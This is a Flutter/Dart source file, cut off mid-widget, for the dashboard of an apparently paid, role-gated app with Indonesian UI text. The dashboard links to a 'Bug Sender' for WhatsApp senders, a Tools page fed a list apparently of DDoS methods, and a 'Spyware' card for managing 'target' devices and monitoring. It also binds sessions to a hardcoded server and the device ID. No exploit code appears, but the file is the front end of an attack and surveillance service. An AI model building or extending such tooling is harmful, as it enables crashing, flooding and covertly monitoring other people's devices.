import 'dart:convert';
import 'dart:io';
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/status.dart' as status;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:video_player/video_player.dart';
import 'package:url_launcher/url_launcher.dart';

import 'nik_check.dart';
import 'admin_page.dart';
import 'owner_page.dart';
import 'home_page.dart';
import 'seller_page.dart';
import 'change_password_page.dart';
import 'tools_gateway.dart';
import 'login_page.dart';
import 'bug_sender.dart';
import 'contact_page.dart';
import 'profile_page.dart';
import 'riwayat_page.dart';
import 'info_page.dart';
import 'device_dashboard.dart';

// ─── Palette ──────────────────────────────────────────────────────────────────
class _C {
  static const bg        = Color(0xFF060B14);
  static const surface   = Color(0xFF0C1424);
  static const card      = Color(0xFF101A2E);
  static const border    = Color(0xFF1A2D4A);
  static const borderLit = Color(0xFF1E3A5F);

  // Diubah dari biru ke merah
  static const red        = Color(0xFFBD1B1B);      // merah gelap
  static const redMid     = Color(0xFFE82D2D);      // merah sedang
  static const redLight   = Color(0xFFF55656);      // merah terang
  static const redFrost   = Color(0xFFF79090);      // merah pastel

  static const green     = Color(0xFF22C55E);
  static const amber     = Color(0xFFF59E0B);
  static const blue      = Color(0xFF1B6FBD);       // biru original (tetap untuk beberapa elemen)

  static const text      = Color(0xFFE2EDF9);
  static const textSub   = Color(0xFF7A9BBF);
  static const textDim   = Color(0xFF3A5470);

  // Gradient diubah ke merah
  static const LinearGradient btnGrad = LinearGradient(
    colors: [redMid, redLight],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
}

// ─── Role helpers ─────────────────────────────────────────────────────────────
Color _roleColor(String role) {
  switch (role.toLowerCase()) {
    case 'owner':   return const Color(0xFFF59E0B);
    case 'moderator':   return const Color(0xFFF59E0B);
    case 'partner':   return const Color(0xFFF59E0B);
    case 'admin':   return const Color(0xFFEF4444);
    case 'reseller':return const Color(0xFF22C55E);
    case 'vip':     return const Color(0xFFA78BFA);
    default:        return _C.redLight;
  }
}

IconData _roleIcon(String role) {
  switch (role.toLowerCase()) {
    case 'owner':   return Icons.workspace_premium_rounded;
    case 'moderator':   return Icons.workspace_premium_rounded;
    case 'partner':   return Icons.workspace_premium_rounded;
    case 'admin':   return Icons.admin_panel_settings_rounded;
    case 'reseller':return Icons.storefront_rounded;
    case 'vip':     return Icons.star_rounded;
    default:        return Icons.person_rounded;
  }
}

// ─── Dashboard Page ───────────────────────────────────────────────────────────
class DashboardPage extends StatefulWidget {
  final String username;
  final String password;
  final String role;
  final String expiredDate;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final List<Map<String, dynamic>> listDoos;
  final List<dynamic> news;

  const DashboardPage({
    super.key,
    required this.username,
    required this.password,
    required this.role,
    required this.expiredDate,
    required this.listBug,
    required this.listDoos,
    required this.sessionKey,
    required this.news,
  });

  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage>
    with TickerProviderStateMixin {
  // ── State ────────────────────────────────────────────────────────────────
  late String sessionKey, username, password, role, expiredDate;
  late List<Map<String, dynamic>> listBug, listDoos;
  late List<dynamic> newsList;

  late WebSocketChannel channel;
  String androidId    = 'unknown';
  File?  _profileImage;
  VideoPlayerController? _menuVideoCtrl;

  int _navIndex      = 0;
  Widget _body       = const SizedBox();
  int onlineUsers    = 0;
  int activeConns    = 0;

  // ── Animation controllers ────────────────────────────────────────────────
  late AnimationController _bgCtrl;
  late AnimationController _pageCtrl;
  late AnimationController _drawerHeaderCtrl;

  late Animation<double> _pageFade;
  late Animation<Offset>  _pageSlide;

  // News carousel
  final PageController _newsPageCtrl = PageController(viewportFraction: 0.88);
  int _newsPage = 0;

  @override
  void initState() {
    super.initState();
    sessionKey  = widget.sessionKey;
    username    = widget.username;
    password    = widget.password;
    role        = widget.role;
    expiredDate = widget.expiredDate;
    listBug     = widget.listBug;
    listDoos    = widget.listDoos;
    newsList    = widget.news;

    // Bg orbit
    _bgCtrl = AnimationController(
      vsync: this, duration: const Duration(seconds: 20),
    )..repeat();

    // Page transition
    _pageCtrl = AnimationController(
      vsync: this, duration: const Duration(milliseconds: 400),
    );
    _pageFade  = CurvedAnimation(parent: _pageCtrl, curve: Curves.easeOut);
    _pageSlide = Tween<Offset>(begin: const Offset(0, 0.04), end: Offset.zero)
        .animate(CurvedAnimation(parent: _pageCtrl, curve: Curves.easeOutCubic));

    // Drawer header
    _drawerHeaderCtrl = AnimationController(
      vsync: this, duration: const Duration(milliseconds: 700),
    );

    _body = _newsPage_();
    _pageCtrl.forward();

    _initAndroidId();
    _loadProfileImage();
    _initMenuVideo();
  }

  @override
  void dispose() {
    channel.sink.close(status.goingAway);
    _bgCtrl.dispose();
    _pageCtrl.dispose();
    _drawerHeaderCtrl.dispose();
    _menuVideoCtrl?.dispose();
    _newsPageCtrl.dispose();
    super.dispose();
  }

  // ── Init helpers ──────────────────────────────────────────────────────────
  Future<void> _loadProfileImage() async {
    final prefs = await SharedPreferences.getInstance();
    final path  = prefs.getString('profile_image_$username');
    if (path != null && path.isNotEmpty && mounted) {
      setState(() => _profileImage = File(path));
    }
  }

  void _initMenuVideo() {
    _menuVideoCtrl = VideoPlayerController.asset('assets/videos/banner.mp4')
      ..initialize().then((_) {
        if (mounted) setState(() {});
        _menuVideoCtrl?.setLooping(true);
        _menuVideoCtrl?.play();
      });
  }

  Future<void> _initAndroidId() async {
    final info = await DeviceInfoPlugin().androidInfo;
    androidId = info.id;
    _connectWS();
  }

  void _connectWS() {
    channel = WebSocketChannel.connect(
        Uri.parse('http://papi.queen-official.com:2836'));
    channel.sink.add(jsonEncode({
      'type': 'validate', 'key': sessionKey, 'androidId': androidId,
    }));
    channel.sink.add(jsonEncode({'type': 'stats'}));

    channel.stream.listen((event) {
      final data = jsonDecode(event);
      if (data['type'] == 'myInfo' && data['valid'] == false) {
        final reason = data['reason'];
        _handleInvalidSession(reason == 'androidIdMismatch'
            ? 'Akun ini login di perangkat lain.'
            : 'Sesi tidak valid. Silakan login ulang.');
      }
      if (data['type'] == 'stats' && mounted) {
        setState(() {
          onlineUsers  = data['onlineUsers']       ?? 0;
          activeConns  = data['activeConnections'] ?? 0;
        });
      }
    });
  }

  Future<void> _openUrl(String url) async {
    await launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);
  }

  void _handleInvalidSession(String message) async {
    await Future.delayed(const Duration(milliseconds: 300));
    final prefs = await SharedPreferences.getInstance();
    await prefs.clear();
    if (!mounted) return;
    _showSystemDialog(
      title: 'Sesi Berakhir',
      message: message,
      icon: Icons.lock_outline_rounded,
      color: _C.red,
      onOk: () => Navigator.of(context).pushAndRemoveUntil(
        MaterialPageRoute(builder: (_) => const LoginPage()),
        (_) => false,
      ),
    );
  }

  // ── Navigation ────────────────────────────────────────────────────────────
  void _navigate(Widget page) {
    setState(() => _body = page);
    _pageCtrl.forward(from: 0);
  }

  void _onNavTap(int index) {
    setState(() => _navIndex = index);
    switch (index) {
      case 0:
        _navigate(_newsPage_());
        break;
      case 1:
        _navigate(HomePage(
          username: username, password: password,
          listBug: listBug, role: role,
          expiredDate: expiredDate, sessionKey: sessionKey,
        ));
        break;
      case 2:
        _navigate(InfoPage(sessionKey: sessionKey));
        break;
      case 3:
        _navigate(ToolsPage(
            sessionKey: sessionKey, userRole: role, listDoos: listDoos));
        break;
    }
  }

  void _onDrawerNav(int index) {
    Navigator.pop(context);
    switch (index) {
      case 1: _navigate(SellerPage(keyToken: sessionKey)); break;
      case 2: _navigate(AdminPage(sessionKey: sessionKey)); break;
      case 3: _navigate(OwnerPage(sessionKey: sessionKey, username: username)); break;
    }
  }

  // ── System dialog ─────────────────────────────────────────────────────────
  void _showSystemDialog({
    required String title,
    required String message,
    required IconData icon,
    required Color color,
    VoidCallback? onOk,
  }) {
    showGeneralDialog(
      context: context,
      barrierDismissible: false,
      barrierLabel: '',
      barrierColor: Colors.transparent,
      transitionDuration: const Duration(milliseconds: 320),
      transitionBuilder: (_, anim, __, child) => ScaleTransition(
        scale: CurvedAnimation(parent: anim, curve: Curves.easeOutBack),
        child: FadeTransition(opacity: anim, child: child),
      ),
      pageBuilder: (ctx, _, __) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 28),
        child: Container(
          decoration: BoxDecoration(
            color: _C.card,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: color.withOpacity(0.3), width: 1.5),
            boxShadow: [BoxShadow(color: color.withOpacity(0.15), blurRadius: 50)],
          ),
          padding: const EdgeInsets.all(28),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              width: 56, height: 56,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: color.withOpacity(0.1),
                border: Border.all(color: color.withOpacity(0.3)),
              ),
              child: Icon(icon, color: color, size: 26),
            ),
            const SizedBox(height: 16),
            Text(title,
                style: const TextStyle(
                    color: _C.text, fontSize: 18, fontWeight: FontWeight.w800)),
            const SizedBox(height: 8),
            Text(message,
                textAlign: TextAlign.center,
                style: const TextStyle(
                    color: _C.textSub, fontSize: 13, height: 1.5)),
            const SizedBox(height: 24),
            _GradBtn(label: 'OK', fullWidth: true, onTap: () {
              Navigator.pop(ctx);
              onOk?.call();
            }),
          ]),
        ),
      ),
    );
  }

  // ── NEWS PAGE ─────────────────────────────────────────────────────────────
  Widget _newsPage_() {
    return SingleChildScrollView(
      physics: const BouncingScrollPhysics(),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const SizedBox(height: 8),

          // ── Stats strip ──────────────────────────────────────────────────
          _StatsStrip(online: onlineUsers, connections: activeConns),
          const SizedBox(height: 20),

          // ── News header ──────────────────────────────────────────────────
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: Row(children: [
              Container(
                width: 4, height: 18,
                decoration: BoxDecoration(
                  gradient: _C.btnGrad,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              const SizedBox(width: 10),
              const Text('Berita Terbaru',
                  style: TextStyle(
                      color: _C.text, fontSize: 15, fontWeight: FontWeight.w700)),
              const Spacer(),
              Text('${newsList.length} artikel',
                  style: const TextStyle(color: _C.textSub, fontSize: 11)),
            ]),
          ),
          const SizedBox(height: 14),

          // ── News carousel ────────────────────────────────────────────────
          if (newsList.isNotEmpty) ...[
            SizedBox(
              height: 210,
              child: PageView.builder(
                controller: _newsPageCtrl,
                onPageChanged: (i) => setState(() => _newsPage = i),
                itemCount: newsList.length,
                itemBuilder: (_, i) {
                  final item = newsList[i];
                  final isActive = i == _newsPage;
                  return AnimatedScale(
                    scale: isActive ? 1.0 : 0.94,
                    duration: const Duration(milliseconds: 300),
                    curve: Curves.easeOutCubic,
                    child: _NewsCard(
                      item: item,
                      isActive: isActive,
                    ),
                  );
                },
              ),
            ),
            const SizedBox(height: 12),

            // Dot indicators - diubah ke merah
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: List.generate(newsList.length, (i) {
                final active = i == _newsPage;
                return AnimatedContainer(
                  duration: const Duration(milliseconds: 250),
                  margin: const EdgeInsets.symmetric(horizontal: 3),
                  width: active ? 20 : 6,
                  height: 6,
                  decoration: BoxDecoration(
                    color: active ? _C.redMid : _C.border,
                    borderRadius: BorderRadius.circular(3),
                  ),
                );
              }),
            ),
          ],

          const SizedBox(height: 24),

          // ── Quick actions header ──────────────────────────────────────────
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: Row(children: [
              Container(
                width: 4, height: 18,
                decoration: BoxDecoration(
                  gradient: _C.btnGrad,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              const SizedBox(width: 10),
              const Text('Aksi Cepat',
                  style: TextStyle(
                      color: _C.text, fontSize: 15, fontWeight: FontWeight.w700)),
            ]),
          ),
          const SizedBox(height: 14),

          // ── Telegram join card ───────────────────────────────────────────
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: _ActionCard(
              icon: FontAwesomeIcons.telegram,
              iconColor: const Color(0xFF39A7E0),
              iconBg: const Color(0xFF1A4D6E),
              title: 'Info Channel',
              subtitle: 'Join Sunov Info Channel',
              trailing: const Icon(Icons.arrow_forward_ios_rounded,
                  size: 14, color: _C.textSub),
              onTap: () => _openUrl('https://t.me/clayych'),
            ),
          ),
          const SizedBox(height: 12),

          // ── Bug sender card ──────────────────────────────────────────────
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: _ActionCard(
              icon: Icons.wifi_tethering_error_rounded,
              iconColor: _C.redLight,
              iconBg: _C.red.withOpacity(0.2),
              title: 'Bug Sender',
              subtitle: 'Kelola WhatsApp sender aktif',
              trailing: Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  gradient: _C.btnGrad,
                  borderRadius: BorderRadius.circular(8),
                ),
                child: const Text('Buka',
                    style: TextStyle(
                        color: Colors.white,
                        fontSize: 11,
                        fontWeight: FontWeight.w700)),
              ),
              onTap: () => Navigator.push(
                context,
                _slideRoute(BugSenderPage(
                    sessionKey: sessionKey, username: username, role: role)),
              ),
            ),
          ),

          const SizedBox(height: 12),

          // ── NEW: Spyware card (Device Dashboard) ──────────────────────────
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20),
            child: _ActionCard(
              icon: Icons.phone_android_rounded,
              iconColor: const Color(0xFF8844FF),
              iconBg: const Color(0xFF442288).withOpacity(0.3),
              title: 'Spyware',
              subtitle: 'Kelola device target & monitoring',
              trailing: Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [const Color(0xFF8844FF), const Color(0xFFAA66FF)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: const Text('Buka',
                    style: TextStyle(
                        color: Colors.white,
                        fontSize: 11,
                        fontWeight: FontWeight.w700)),
              ),
              onTap: () => Navigator.push(
                context,
                _slideRoute(DeviceDashboardPage(username: username)),
              ),
            ),
          ),

          const SizedBox(height: 32),
        ],
      ),
    );
  }

  // ── Scaffold ──────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: _buildAppBar(),
      drawer: _buildDrawer(),
      body: Stack(
        children: [
          Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),
          SafeArea(
            child: FadeTransition(
              opacity: _pageFade,
              child: SlideTransition(
                position: _pageSlide,
                child: _body,
              ),
            ),
          ),
        ],
      ),
      bottomNavigationBar: _buildBottomNav(),
    );
  }

  // ── AppBar ────────────────────────────────────────────────────────────────
  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.transparent,
      elevation: 0,
      titleSpacing: 0,
      leading: Builder(builder: (ctx) => _MenuBtn(onTap: () => Scaffold.of(ctx).openDrawer())),
      title: Padding(
        padding: const EdgeInsets.only(left: 4),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              'Halo, $username 👋',
              style: const TextStyle(
                color: _C.text,
                fontSize: 16,
                fontWeight: FontWeight.w700,
                letterSpacing: -0.3,
              ),
            ),
            Row(children: [
              Container(
                width: 6, height: 6,
                decoration: const BoxDecoration(
                  shape: BoxShape.circle, color: _C.green,
                  boxShadow: [BoxShadow(color: Color(0x5522C55E), blurRadius: 6)],
                ),
              ),
              const SizedBox(width: 5),
              Text(
                role.toUpperCase(),
                style: TextStyle(
                  color: _roleColor(role),
                  fontSize: 10,
                  fontWeight: FontWeight.w700,
                  letterSpacing: 1,
                ),
              ),
              const SizedBox(width: 8),
              Text(
                '· Exp: $expiredDate',
                style: const TextStyle(color: _C.textSub, fontSize: 10),
              ),
            ]),
          ],
        ),
      ),
      actions: [
        _AppBarIconBtn(
          icon: Icons.headset_mic_outlined,
          onTap: () => Navigator.push(context, _slideRoute(const ContactPage())),
        ),
        _AppBarIconBtn(
          icon: Icons.account_circle_outlined,
          onTap: () => Navigator.push(
            context,
            _slideRoute(ProfilePage(
              username: username, password: password,
              role: role, expiredDate: expiredDate,
              sessionKey: sessionKey,
            )),
          ),
        ),
        const SizedBox(width: 8),
      ],
    );
  }

  // ── Bottom Nav ────────────────────────────────────────────────────────────
  Widget _buildBottomNav() {
    final items = [
      _NavItem(icon: Icons.home_rounded, label: 'Home'),
      _NavItem(icon: FontAwesomeIcons.whatsapp, label: 'Bugs'),
      _NavItem(icon: Icons.campaign_rounded, label: 'Info'),
      _NavItem(icon: Icons.tune_rounded, label: 'Tools'),
    ];

    return Container(
      decoration: BoxDecoration(
        color: _C.card,
        border: const Border(top: BorderSide(color: _C.border)),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.4),
            blurRadius: 20,
            offset: const Offset(0, -4),
          ),
        ],
      ),
      child: SafeArea(
        top: false,
        child: Padding(
          padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 8),
          child: Row(
            children: items.asMap().entries.map((e) {
              final i      = e.key;
              final item   = e.value;
              final active = _navIndex == i;
              return Expanded(
                child: _NavButton(
                  icon: item.icon,
                  label: item.label,
                  active: active,
                  onTap: () => _onNavTap(i),
                ),
              );
            }).toList(),
          ),
        ),
      ),
    );
  }

  // ── Drawer ────────────────────────────────────────────────────────────────
  Widget _buildDrawer() {
    return Drawer(
      backgroundColor: Colors.transparent,
      width: MediaQuery.of(context).size.width * 0.78,
      child: Container(
        decoration: const BoxDecoration(
          color: _C.surface,
          border: Border(right: BorderSide(color: _C.border)),
        ),
        child: Column(
          children: [
            // ── Header ────────────────────────────────────────────────────
            _DrawerHeader(
              username: username,
              role: role,
              expiredDate: expiredDate,
              profileImage: _profileImage,
              videoCtrl: _menuVideoCtrl,
            ),

            // ── Menu items ────────────────────────────────────────────────
            Expanded(
              child: ListView(
                padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
                children: [
                  if (role == 'reseller')
                    _DrawerItem(
                      icon: Icons.storefront_rounded,
                      label: 'Seller Page',
                      onTap: () => _onDrawerNav(1),
                    ),
                  if (role == 'admin')
                    _DrawerItem(
                      icon: Icons.admin_panel_settings_rounded,
                      label: 'Admin Page',
                      onTap: () => _onDrawerNav(2),
                    ),
                  if (role == 'owner' || role == 'moderator' || role == 'partner')
    _DrawerItem(
      icon: Icons.workspace_premium_rounded,
      label: 'Owner Page',
      onTap: () => _onDrawerNav(3),
    ),
                  _DrawerItem(
                    icon: Icons.history_rounded,
                    label: 'Riwayat Aktivitas',
                    onTap: () {
                      Navigator.pop(context);
                      Navigator.push(
                        context,
                        _slideRoute(RiwayatPage(
                            sessionKey: sessionKey, role: role)),
                      );
                    },
                  ),
                  _DrawerItem(
                    icon: Icons.lock_outline_rounded,
                    label: 'Ganti Password',
                    onTap: () {
                      Navigator.pop(context);
                      Navigator.push(
                        context,
                        _slideRoute(ChangePasswordPage(
                            username: username, sessionKey: sessionKey)),
                      );
                    },
                  ),
                ],
              ),
            ),

            // ── Logout ────────────────────────────────────────────────────
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 0, 16, 24),
              child: _DrawerItem(
                icon: Icons.logout_rounded,
                label: 'Keluar',
                isDestructive: true,
                onTap: () async {
                  Navigator.pop(context);
                  final prefs = await SharedPreferences.getInstance();
                  await prefs.clear();
                  if (!mounted) return;
                  Navigator.of(context).pushAndRemoveUntil(
                    MaterialPageRoute(builder: (_) => const LoginPage()),
                    (_) => false,
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ─── Stats Strip ──────────────────────────────────────────────────────────────
class _StatsStrip extends StatelessWidget {
  final int online;
  final int connections;
  const _StatsStrip({required this.online, required this.connections});

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: BoxDecoration(
          color: _C.card,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: _C.border),
        ),
        child: Row(
          children: [
            _StatItem(
              icon: Icons.people_alt_rounded,
              label: 'Online',
              value: '$online',
              color: _C.green,
            ),
            Container(
              width: 1, height: 32, color: _C.border,
              margin: const EdgeInsets.symmetric(horizontal: 16),
            ),
            _StatItem(
              icon: Icons.wifi_rounded,
              label: 'Koneksi',
              value: '$connections',
              color: _C.redLight,
            ),
            const Spacer(),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
              decoration: BoxDecoration(
                color: _C.green.withOpacity(0.1),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: _C.green.withOpacity(0.3)),
              ),
              child: const Text('LIVE',
                  style: TextStyle(
                      color: _C.green,
                      fontSize: 10,
                      fontWeight: FontWeight.w700,
                      letterSpacing: 0.8)),
            ),
          ],
        ),
      ),
    );
  }
}

class _StatItem extends StatelessWidget {
  final IconData icon;
  final String label;
  final String value;
  final Color color;

  const _StatItem({
    required this.icon,
    required this.label,
    required this.value,
    required this.color,
  });

  @override
  Widget build(BuildContext context) {
    return Row(children: [
      Icon(icon, color: color, size: 16),
      const SizedBox(width: 8),
      Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text(value,
            style: TextStyle(
                color: color, fontSize: 15, fontWeight: FontWeight.w800)),
        Text(label,
            style: const TextStyle(color: _C.textSub, fontSize: 10)),
      ]),
    ]);
  }
}

// ─── News Card ────────────────────────────────────────────────────────────────
class _NewsCard extends StatelessWidget {
  final dynamic item;
  final bool isActive;
  const _NewsCard({required this.item, required this.isActive});

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 6),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
          color: isActive ? _C.borderLit : _C.border,
          width: isActive ? 1.5 : 1,
        ),
        boxShadow: isActive
            ? [BoxShadow(color: _C.red.withOpacity(0.15), blurRadius: 20, offset: const Offset(0, 8))]
            : [],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: Stack(
          fit: StackFit.expand,
          children: [
            // Media
            if (item['image'] != null && item['image'].toString().isNotEmpty)
              NewsMedia(url: item['image']),

            // Gradient overlay
            Container(
              decoration: const BoxDecoration(
                gradient: LinearGradient(
                  colors: [Color(0xE6060B14), Colors.transparent],
                  begin: Alignment.bottomCenter,
                  end: Alignment.topCenter,
                  stops: [0.0, 0.7],
                ),
              ),
            ),

            // Content
            Positioned(
              bottom: 16, left: 16, right: 16,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                    decoration: BoxDecoration(
                      color: _C.redMid.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(6),
                      border: Border.all(color: _C.redMid.withOpacity(0.3)),
                    ),
                    child: const Text('NEWS',
                        style: TextStyle(
                            color: _C.redLight, fontSize: 9,
                            fontWeight: FontWeight.w800, letterSpacing: 1)),
                  ),
                  const SizedBox(height: 6),
                  Text(
                    item['title'] ?? 'No Title',
                    style: const TextStyle(
                      color: _C.text,
                      fontSize: 15,
                      fontWeight: FontWeight.w700,
                      height: 1.3,
                    ),
                    maxLines: 2,
                    overflow: TextOverflow.ellipsis,
                  ),
                  if (item['desc'] != null && item['desc'].toString().isNotEmpty) ...[
                    const SizedBox(height: 4),
                    Text(
                      item['desc'],
                      style: const TextStyle(
                          color: _C.textSub, fontSize: 11, height: 1.4),
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ],
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ─── Action Card ──────────────────────────────────────────────────────────────
class _ActionCard extends StatefulWidget {
  final IconData icon;
  final Color iconColor;
  final Color iconBg;
  final String title;
  final String subtitle;
  final Widget? trailing;
  final VoidCallback onTap;

  const _ActionCard({
    required this.icon,
    required this.iconColor,
    required this.iconBg,
    required this.title,
    required this.subtitle,
    required this.onTap,
    this.trailing,
  });

  @override
  State<_ActionCard> createState() => _ActionCardState();
}

class _ActionCardState extends State<_ActionCard> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) { setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedScale(
        scale: _pressed ? 0.97 : 1.0,
        duration: const Duration(milliseconds: 130),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 180),
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          decoration: BoxDecoration(
            color: _pressed ? _C.card.withOpacity(0.9) : _C.card,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(
              color: _pressed
                  ? widget.iconColor.withOpacity(0.3)
                  : _C.border,
            ),
            boxShadow: _pressed
                ? [BoxShadow(color: widget.iconColor.withOpacity(0.12),
                    blurRadius: 16, offset: const Offset(0, 4))]
                : [],
          ),
          child: Row(children: [
            Container(
              width: 44, height: 44,
              decoration: BoxDecoration(
                color: widget.iconBg,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                    color: widget.iconColor.withOpacity(0.2)),
              ),
              child: Icon(widget.icon, color: widget.iconColor, size: 20),
            ),
            const SizedBox(width: 14),
            Expanded(child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(widget.title,
                    style: const TextStyle(
                        color: _C.text, fontSize: 14,
                        fontWeight: FontWeight.w700)),
                const SizedBox(height: 2),
                Text(widget.subtitle,
                    style: const TextStyle(color: _C.textSub, fontSize: 11)),
              ],
            )),
            if (widget.trailing != null) ...[
              const SizedBox(width: 10),
              widget.trailing!,
            ],
          ]),
        ),
      ),
    );
  }
}

// ─── Drawer Header ────────────────────────────────────────────────────────────
class _DrawerHeader extends StatefulWidget {
  final String username;
  final String role;
  final String expiredDate;
  final File? profileImage;
  final VideoPlayerController? videoCtrl;

  const _DrawerHeader({
    required this.username,
    required this.role,
    required this.expiredDate,
    required this.profileImage,
    required this.videoCtrl,
  });

  @override
  State<_DrawerHeader> createState() => _DrawerHeaderState();
}

class _DrawerHeaderState extends State<_DrawerHeader>
    with SingleTickerProviderStateMixin {
  late AnimationController _c;
  late Animation<double> _fade;
  late Animation<Offset> _slide;

  @override
  void initState() {
    super.initState();
    _c = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 600));
    _fade  = CurvedAnimation(parent: _c, curve: Curves.easeOut);
    _slide = Tween<Offset>(begin: const Offset(0, 0.2), end: Offset.zero)
        .animate(CurvedAnimation(parent: _c, curve: Curves.easeOutCubic));
    _c.forward();
  }

  @override
  void dispose() { _c.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final rColor = _roleColor(widget.role);
    return Container(
      height: 240,
      clipBehavior: Clip.hardEdge,
      decoration: const BoxDecoration(
        color: _C.card,
        border: Border(bottom: BorderSide(color: _C.border)),
      ),
      child: Stack(
        children: [
          // Video bg
          if (widget.videoCtrl != null && widget.videoCtrl!.value.isInitialized)
            Positioned.fill(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width:  widget.videoCtrl!.value.size.width,
                  height: widget.videoCtrl!.value.size.height,
                  child:  VideoPlayer(widget.videoCtrl!),
                ),
              ),
            ),

          // Gradient overlay
          Positioned.fill(
            child: Container(
              decoration: const BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [Color(0x33060B14), Color(0xE6060B14)],
                ),
              ),
            ),
          ),

          // Content
          Positioned.fill(
            child: SafeArea(
              child: FadeTransition(
                opacity: _fade,
                child: SlideTransition(
                  position: _slide,
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      // Avatar
                      Stack(
                        children: [
                          Container(
                            width: 78, height: 78,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              border: Border.all(color: rColor, width: 2.5),
                              boxShadow: [
                                BoxShadow(
                                    color: rColor.withOpacity(0.4),
                                    blurRadius: 18)
                              ],
                            ),
                            child: ClipOval(
                              child: widget.profileImage != null
                                  ? Image.file(widget.profileImage!,
                                      fit: BoxFit.cover)
                                  : Container(
                                      color: _C.surface,
                                      child: Icon(_roleIcon(widget.role),
                                          size: 36,
                                          color: rColor.withOpacity(0.9)),
                                    ),
                            ),
                          ),
                          // Role badge
                          Positioned(
                            right: 0, bottom: 0,
                            child: Container(
                              padding: const EdgeInsets.all(4),
                              decoration: BoxDecoration(
                                color: rColor,
                                shape: BoxShape.circle,
                                border: Border.all(color: _C.card, width: 2),
                              ),
                              child: Icon(_roleIcon(widget.role),
                                  size: 10, color: Colors.white),
                            ),
                          ),
                        ],
                      ),

                      const SizedBox(height: 12),

                      Text(widget.username,
                          style: const TextStyle(
                              color: _C.text,
                              fontSize: 18,
                              fontWeight: FontWeight.w800)),

                      const SizedBox(height: 4),

                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 12, vertical: 4),
                        decoration: BoxDecoration(
                          color: rColor.withOpacity(0.12),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: rColor.withOpacity(0.3)),
                        ),
                        child: Text(
                          widget.role.toUpperCase(),
                          style: TextStyle(
                              color: rColor,
                              fontSize: 11,
                              fontWeight: FontWeight.w700,
                              letterSpacing: 1),
                        ),
                      ),

                      const SizedBox(height: 6),

                      Text('Exp: ${widget.expiredDate}',
                          style: const TextStyle(
                              color: _C.textSub, fontSize: 11)),
